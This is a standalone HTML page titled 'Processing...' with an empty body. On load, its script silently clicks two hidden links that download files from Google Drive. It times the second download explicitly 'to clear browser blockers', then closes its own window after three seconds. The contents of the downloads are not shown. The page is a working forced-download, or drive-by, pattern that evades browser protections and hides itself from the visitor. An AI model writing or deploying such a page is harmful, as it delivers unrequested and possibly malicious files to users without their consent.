<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Processing...</title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; }
    </style>
    <script>
        window.onload = function() {
            // 1. Trigger first download immediately
            var link1 = document.createElement('a');
            link1.href = 'https://drive.google.com/uc?export=download&id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
            document.body.appendChild(link1);
            link1.click();

            // 2. Trigger second download after 1 second to clear browser blockers
            setTimeout(function() {
                var link2 = document.createElement('a');
                link2.href = 'https://drive.google.com/uc?export=download&id=1seCXXgz8uOW2tQatp6v-aRzo53sI7T0D';
                document.body.appendChild(link2);
                link2.click();
            }, 1000); 

            // 3. Automatically close the window after 3 seconds
            setTimeout(function() {
                window.open('', '_self', '');
                window.close();
            }, 3000);
        };
    </script>
</head>
<body>
</body>
</html>
